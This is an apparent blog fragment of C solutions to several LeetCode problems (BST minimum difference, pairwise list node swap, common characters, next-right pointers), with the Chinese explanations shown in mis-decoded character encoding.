href="https://leetcode-cn.com/problems/partition-equal-subset-sum">https://leetcode-cn.com/problems/partition-equal-subset-sum</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>DPï¼Œ01èƒŒåŒ…å˜ç§ï¼Œé¢˜è§£å…ˆå’•å’•å’•ï¼ˆ</p><h3 id="12-530-äºŒå‰æœç´¢æ ‘çš„æœ€å°ç»å¯¹å·®ï¼ˆç®€å•ï¼‰"><a href="#12-530-äºŒå‰æœç´¢æ ‘çš„æœ€å°ç»å¯¹å·®ï¼ˆç®€å•ï¼‰" class="headerlink" title="12 - 530. äºŒå‰æœç´¢æ ‘çš„æœ€å°ç»å¯¹å·®ï¼ˆç®€å•ï¼‰"></a>12 - <a href="https://leetcode-cn.com/problems/minimum-absolute-difference-in-bst/">530. äºŒå‰æœç´¢æ ‘çš„æœ€å°ç»å¯¹å·®ï¼ˆç®€å•ï¼‰</a></h3><blockquote><p>ç»™ä½ ä¸€æ£µæ‰€æœ‰èŠ‚ç‚¹ä¸ºéè´Ÿå€¼çš„äºŒå‰æœç´¢æ ‘ï¼Œè¯·ä½ è®¡ç®—æ ‘ä¸­ä»»æ„ä¸¤èŠ‚ç‚¹çš„å·®çš„ç»å¯¹å€¼çš„æœ€å°å€¼ã€‚</p><p>ç¤ºä¾‹ï¼š</p><p>è¾“å…¥ï¼š</p><p>   1<br>    <br>     3<br>    &#x2F;<br>   2</p><p>è¾“å‡ºï¼š<br>1</p><p>è§£é‡Šï¼š<br>æœ€å°ç»å¯¹å·®ä¸º 1ï¼Œå…¶ä¸­ 2 å’Œ 1 çš„å·®çš„ç»å¯¹å€¼ä¸º 1ï¼ˆæˆ–è€… 2 å’Œ 3ï¼‰ã€‚</p><p>æç¤ºï¼š</p><p>æ ‘ä¸­è‡³å°‘æœ‰ 2 ä¸ªèŠ‚ç‚¹ã€‚<br>æœ¬é¢˜ä¸ 783 <a href="https://leetcode-cn.com/problems/minimum-distance-between-bst-nodes/">https://leetcode-cn.com/problems/minimum-distance-between-bst-nodes/</a> ç›¸åŒ</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/minimum-absolute-difference-in-bst">https://leetcode-cn.com/problems/minimum-absolute-difference-in-bst</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><h4 id="è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢-ä¸­åºéå†"><a href="#è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢-ä¸­åºéå†" class="headerlink" title="è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ + ä¸­åºéå†"></a>è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ + ä¸­åºéå†</h4><p>å› ä¸ºæ˜¯äºŒå‰æœç´¢æ ‘ï¼Œæ‰€ä»¥å½“è¿›è¡Œä¸­åºéå†æ—¶è‚¯å®šä¼šæŒ‰ç…§ä»å°åˆ°å¤§çš„ç»“ç‚¹è¿›è¡Œéå†</p><p>æœ€å°ç»å¯¹å·®è‚¯å®šå‡ºç°åœ¨ç›¸é‚»å€¼ç»“ç‚¹ä¸­ï¼Œè¿™é‡Œå°±ä¸å†è¿‡å¤šèµ˜å™äº†</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> ans = <span class="number">0xffff</span>;</span><br><span class="line"><span class="type">int</span> pre = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    dfs(root-&gt;left);</span><br><span class="line">    <span class="keyword">if</span>(pre == <span class="number">-1</span>)</span><br><span class="line">        pre = root-&gt;val;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        ans = (root-&gt;val - pre) &lt; ans ? (root-&gt;val - pre) : ans;</span><br><span class="line">        pre = root-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(root-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">getMinimumDifference</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span></span><br><span class="line">&#123;</span><br><span class="line">    pre = <span class="number">-1</span>;</span><br><span class="line">    ans = <span class="number">0xffff</span>;</span><br><span class="line">    dfs(root);</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/12/EUzkxuqK2ja4cFl.png" alt="image.png"></p><h3 id="13-24-ä¸¤ä¸¤äº¤æ¢é“¾è¡¨ä¸­çš„èŠ‚ç‚¹ï¼ˆä¸­ç­‰ï¼‰"><a href="#13-24-ä¸¤ä¸¤äº¤æ¢é“¾è¡¨ä¸­çš„èŠ‚ç‚¹ï¼ˆä¸­ç­‰ï¼‰" class="headerlink" title="13 - 24.ä¸¤ä¸¤äº¤æ¢é“¾è¡¨ä¸­çš„èŠ‚ç‚¹ï¼ˆä¸­ç­‰ï¼‰"></a>13 - <a href="https://leetcode-cn.com/problems/swap-nodes-in-pairs/">24.ä¸¤ä¸¤äº¤æ¢é“¾è¡¨ä¸­çš„èŠ‚ç‚¹ï¼ˆä¸­ç­‰ï¼‰</a></h3><blockquote><p>ç»™å®šä¸€ä¸ªé“¾è¡¨ï¼Œä¸¤ä¸¤äº¤æ¢å…¶ä¸­ç›¸é‚»çš„èŠ‚ç‚¹ï¼Œå¹¶è¿”å›äº¤æ¢åçš„é“¾è¡¨ã€‚</p><p>ä½ ä¸èƒ½åªæ˜¯å•çº¯çš„æ”¹å˜èŠ‚ç‚¹å†…éƒ¨çš„å€¼ï¼Œè€Œæ˜¯éœ€è¦å®é™…çš„è¿›è¡ŒèŠ‚ç‚¹äº¤æ¢ã€‚</p><p>ç¤ºä¾‹:</p><p>ç»™å®š 1-&gt;2-&gt;3-&gt;4, ä½ åº”è¯¥è¿”å› 2-&gt;1-&gt;4-&gt;3.</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/swap-nodes-in-pairs">https://leetcode-cn.com/problems/swap-nodes-in-pairs</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>å¾ˆç®€å•çš„ä¸€ä¸ªäº¤æ¢ç»“ç‚¹çš„é¢˜ï¼Œä¸¤ä¸¤äº¤æ¢å³å¯</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">swapPairs</span><span class="params">(<span class="keyword">struct</span> ListNode* head)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!head || !head-&gt;next)</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">temp</span>, *<span class="title">temp2</span> =</span> head-&gt;next-&gt;next, *temp3 = (<span class="keyword">struct</span> ListNode*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ListNode)), *retn = head-&gt;next;</span><br><span class="line">    temp3-&gt;next = head;</span><br><span class="line">    <span class="keyword">while</span>(head)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!head-&gt;next)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        temp2 = head-&gt;next-&gt;next;</span><br><span class="line">        temp = head-&gt;next;</span><br><span class="line">        temp3-&gt;next = temp;</span><br><span class="line">        temp-&gt;next = head;</span><br><span class="line">        head-&gt;next = temp2;</span><br><span class="line">        temp3 = head;</span><br><span class="line">        head = temp2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2020/10/14/WenKdZaqkslmrFg.png" alt="image.png" style="zoom:50%;" /><h3 id="14-1002-æŸ¥æ‰¾å¸¸ç”¨å­—ç¬¦ï¼ˆç®€å•ï¼‰"><a href="#14-1002-æŸ¥æ‰¾å¸¸ç”¨å­—ç¬¦ï¼ˆç®€å•ï¼‰" class="headerlink" title="14 - 1002. æŸ¥æ‰¾å¸¸ç”¨å­—ç¬¦ï¼ˆç®€å•ï¼‰"></a>14 - <a href="https://leetcode-cn.com/problems/find-common-characters/">1002. æŸ¥æ‰¾å¸¸ç”¨å­—ç¬¦ï¼ˆç®€å•ï¼‰</a></h3><blockquote><p>ç»™å®šä»…æœ‰å°å†™å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²æ•°ç»„ Aï¼Œè¿”å›åˆ—è¡¨ä¸­çš„æ¯ä¸ªå­—ç¬¦ä¸²ä¸­éƒ½æ˜¾ç¤ºçš„å…¨éƒ¨å­—ç¬¦ï¼ˆåŒ…æ‹¬é‡å¤å­—ç¬¦ï¼‰ç»„æˆçš„åˆ—è¡¨ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ªå­—ç¬¦åœ¨æ¯ä¸ªå­—ç¬¦ä¸²ä¸­å‡ºç° 3 æ¬¡ï¼Œä½†ä¸æ˜¯ 4 æ¬¡ï¼Œåˆ™éœ€è¦åœ¨æœ€ç»ˆç­”æ¡ˆä¸­åŒ…å«è¯¥å­—ç¬¦ 3 æ¬¡ã€‚</p><p>ä½ å¯ä»¥æŒ‰ä»»æ„é¡ºåºè¿”å›ç­”æ¡ˆã€‚</p><p>ç¤ºä¾‹ 1ï¼š</p><p>è¾“å…¥ï¼š[â€œbellaâ€,â€labelâ€,â€rollerâ€]<br>è¾“å‡ºï¼š[â€œeâ€,â€lâ€,â€lâ€]<br>ç¤ºä¾‹ 2ï¼š</p><p>è¾“å…¥ï¼š[â€œcoolâ€,â€lockâ€,â€cookâ€]<br>è¾“å‡ºï¼š[â€œcâ€,â€oâ€]</p><p>æç¤ºï¼š</p><p>1 &lt;&#x3D; A.length &lt;&#x3D; 100<br>1 &lt;&#x3D; A[i].length &lt;&#x3D; 100<br>A[i][j] æ˜¯å°å†™å­—æ¯</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/find-common-characters">https://leetcode-cn.com/problems/find-common-characters</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>ç›´æ¥ä¸€ä¸ªä¸ªæ•°å³å¯</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">char</span> ** <span class="title function_">commonChars</span><span class="params">(<span class="type">char</span> ** A, <span class="type">int</span> ASize, <span class="type">int</span>* returnSize)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> ** retn = (<span class="type">char</span>**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">void</span>*) * <span class="number">100</span>);</span><br><span class="line">    <span class="type">int</span> ** count = (<span class="type">int</span>**)<span class="built_in">calloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>*), <span class="number">100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">        count[i] = (<span class="type">int</span>*)<span class="built_in">calloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>), <span class="number">30</span>);</span><br><span class="line">    *returnSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;ASize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> *ptr = A[i];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;ptr[j];j++)</span><br><span class="line">            count[i][ptr[j]-<span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">        <span class="type">int</span> min = <span class="number">0xffff</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;ASize;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(count[j][i] == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                flag = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            min = min &gt; count[j][i] ? count[j][i] : min;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;min;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                retn[*returnSize] = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>)*<span class="number">2</span>);</span><br><span class="line">                retn[*returnSize][<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span> + i;</span><br><span class="line">                retn[(*returnSize)++][<span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>![7RM_2__VRFRFEI&#96;8__F5YZW.png](<a href="https://i.loli.net/2020/10/14/Hu76mRdEKPnQY1b.png">https://i.loli.net/2020/10/14/Hu76mRdEKPnQY1b.png</a>)</p><h3 id="15-116-å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆï¼ˆä¸­ç­‰ï¼‰"><a href="#15-116-å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆï¼ˆä¸­ç­‰ï¼‰" class="headerlink" title="15 - 116. å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆï¼ˆä¸­ç­‰ï¼‰"></a>15 - <a href="https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node/">116. å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆï¼ˆä¸­ç­‰ï¼‰</a></h3><blockquote><p>ç»™å®šä¸€ä¸ªå®Œç¾äºŒå‰æ ‘ï¼Œå…¶æ‰€æœ‰å¶å­èŠ‚ç‚¹éƒ½åœ¨åŒä¸€å±‚ï¼Œæ¯ä¸ªçˆ¶èŠ‚ç‚¹éƒ½æœ‰ä¸¤ä¸ªå­èŠ‚ç‚¹ã€‚äºŒå‰æ ‘å®šä¹‰å¦‚ä¸‹ï¼š</p><p>struct Node {<br>  int val;<br>  Node *left;<br>  Node *right;<br>  Node *next;<br>}<br>å¡«å……å®ƒçš„æ¯ä¸ª next æŒ‡é’ˆï¼Œè®©è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘å…¶ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ã€‚å¦‚æœæ‰¾ä¸åˆ°ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ï¼Œåˆ™å°† next æŒ‡é’ˆè®¾ç½®ä¸º NULLã€‚</p><p>åˆå§‹çŠ¶æ€ä¸‹ï¼Œæ‰€æœ‰ next æŒ‡é’ˆéƒ½è¢«è®¾ç½®ä¸º NULLã€‚</p><p>ç¤ºä¾‹ï¼š</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/02/15/116_sample.png" alt="image.png"></p><p>è¾“å…¥ï¼š{â€œ$idâ€:â€1â€,â€leftâ€:{â€œ$idâ€:â€2â€,â€leftâ€:{â€œ$idâ€:â€3â€,â€leftâ€:null,â€nextâ€:null,â€rightâ€:null,â€valâ€:4},â€nextâ€:null,â€rightâ€:{â€œ$idâ€:â€4â€,â€leftâ€:null,â€nextâ€:null,â€rightâ€:null,â€valâ€:5},â€valâ€:2},â€nextâ€:null,â€rightâ€:{â€œ$idâ€:â€5â€,â€leftâ€:{â€œ$idâ€:â€6â€,â€leftâ€:null,â€nextâ€:null,â€rightâ€:null,â€valâ€:6},â€nextâ€:null,â€rightâ€:{â€œ$idâ€:â€7â€,â€leftâ€:null,â€nextâ€:null,â€rightâ€:null,â€valâ€:7},â€valâ€:3},â€valâ€:1}</p><p>è¾“å‡ºï¼š{â€œ$idâ€:â€1â€,â€leftâ€:{â€œ$idâ€:â€2â€,â€leftâ€:{â€œ$idâ€:â€3â€,â€leftâ€:null,â€nextâ€:{â€œ$idâ€:â€4â€,â€leftâ€:null,â€nextâ€:{â€œ$idâ€:â€5â€,â€leftâ€:null,â€nextâ€:{â€œ$idâ€:â€6â€,â€leftâ€:null,â€nextâ€:null,â€rightâ€:null,â€valâ€:7},â€rightâ€:null,â€valâ€:6},â€rightâ€:null,â€valâ€:5},â€rightâ€:null,â€valâ€:4},â€nextâ€:{â€œ$idâ€:â€7â€,â€leftâ€:{â€œ$refâ€:â€5â€},â€nextâ€:null,â€rightâ€:{â€œ$refâ€:â€6â€},â€valâ€:3},â€rightâ€:{â€œ$refâ€:â€4â€},â€valâ€:2},â€nextâ€:null,â€rightâ€:{â€œ$refâ€:â€7â€},â€valâ€:1}</p><p>è§£é‡Šï¼šç»™å®šäºŒå‰æ ‘å¦‚å›¾ A æ‰€ç¤ºï¼Œä½ çš„å‡½æ•°åº”è¯¥å¡«å……å®ƒçš„æ¯ä¸ª next æŒ‡é’ˆï¼Œä»¥æŒ‡å‘å…¶ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ï¼Œå¦‚å›¾ B æ‰€ç¤ºã€‚</p><p>æç¤ºï¼š</p><p>ä½ åªèƒ½ä½¿ç”¨å¸¸é‡çº§é¢å¤–ç©ºé—´ã€‚<br>ä½¿ç”¨é€’å½’è§£é¢˜ä¹Ÿç¬¦åˆè¦æ±‚ï¼Œæœ¬é¢˜ä¸­é€’å½’ç¨‹åºå ç”¨çš„æ ˆç©ºé—´ä¸ç®—åšé¢å¤–çš„ç©ºé—´å¤æ‚åº¦ã€‚</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node">https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><blockquote><p>æ³¨ï¼šæœ¬é¢˜å’Œ2020.9.28çš„æ¯æ—¥ä¸€é¢˜å‡ ä¹å®Œå…¨ä¸€æ ·</p></blockquote><h4 id="è§£æ³•ä¸€ï¼šå±‚æ¬¡éå†-1"><a href="#è§£æ³•ä¸€ï¼šå±‚æ¬¡éå†-1" class="headerlink" title="è§£æ³•ä¸€ï¼šå±‚æ¬¡éå†"></a>è§£æ³•ä¸€ï¼šå±‚æ¬¡éå†</h4><p>æˆ‘ä»¬è€ƒè™‘åˆ°å½“æˆ‘ä»¬å¡«å……nextæŒ‡é’ˆå°†æ¯ä¸€å±‚çš„ç»“ç‚¹éƒ½è¿æ¥èµ·æ¥åï¼Œ<strong>è¯¥å±‚æ‰€æœ‰ç»“ç‚¹ä¾¿æ„æˆäº†ä¸€ä¸ªå•å‘é“¾è¡¨</strong>ï¼Œæˆ‘ä»¬å¯ä»¥<strong>é€šè¿‡éå†æ¯ä¸€å±‚çš„é“¾è¡¨æ¥æ„é€ ä¸‹ä¸€å±‚çš„é“¾è¡¨</strong></p><p>å¤§è‡´è¿‡ç¨‹å¦‚ä¸‹å›¾</p><p><img src="https://i.loli.net/2020/09/28/485DnfumcRterSM.png" alt="BD12E33FCF6E3B97FC6DB3AF5B645CF2.png"></p><h4 id="æ—¶é—´å¤æ‚åº¦ï¼š-7"><a href="#æ—¶é—´å¤æ‚åº¦ï¼š-7" class="headerlink" title="æ—¶é—´å¤æ‚åº¦ï¼š"></a>æ—¶é—´å¤æ‚åº¦ï¼š</h4><p>ç”±äºæ¯ä¸ªç»“ç‚¹éƒ½è¦éå†ä¸€æ¬¡ï¼Œæ•…æ—¶é—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>N</strong>)</p><h4 id="ç©ºé—´å¤æ‚åº¦ï¼š-7"><a href="#ç©ºé—´å¤æ‚åº¦ï¼š-7" class="headerlink" title="ç©ºé—´å¤æ‚åº¦ï¼š"></a>ç©ºé—´å¤æ‚åº¦ï¼š</h4><p>ç”±äºæ²¡æœ‰ä½¿ç”¨åˆ°é¢å¤–çš„ç©ºé—´ï¼Œæ•…ç©ºé—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>1</strong>)</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a Node.</span></span><br><span class="line"><span class="comment"> * struct Node &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct Node *left;</span></span><br><span class="line"><span class="comment"> *     struct Node *right;</span></span><br><span class="line"><span class="comment"> *     struct Node *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> * <span class="title">last_node</span>, *<span class="title">next_start</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">connectList</span><span class="params">(<span class="keyword">struct</span> Node * node)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(last_node)</span><br><span class="line">    &#123;</span><br><span class="line">        last_node-&gt;next = node;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!next_start)</span><br><span class="line">    &#123;</span><br><span class="line">        next_start = node;</span><br><span class="line">    &#125;</span><br><span class="line">    last_node = node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> Node* <span class="title function_">connect</span><span class="params">(<span class="keyword">struct</span> Node* root)</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">start</span> =</span> root;</span><br><span class="line">    <span class="keyword">while</span>(start)</span><br><span class="line">    &#123;</span><br><span class="line">        last_node = <span class="literal">NULL</span>, next_start = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span>(start)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(start-&gt;left)</span><br><span class="line">                connectList(start-&gt;left);</span><br><span class="line">            <span class="keyword">if</span>(start-&gt;right)</span><br><span class="line">                connectList(start-&gt;right);</span><br><span class="line">            start = start-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        start = next_start;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/15/p3if4WBZnAScgLI.png" alt="image.png"></p>]]></content>
    
    
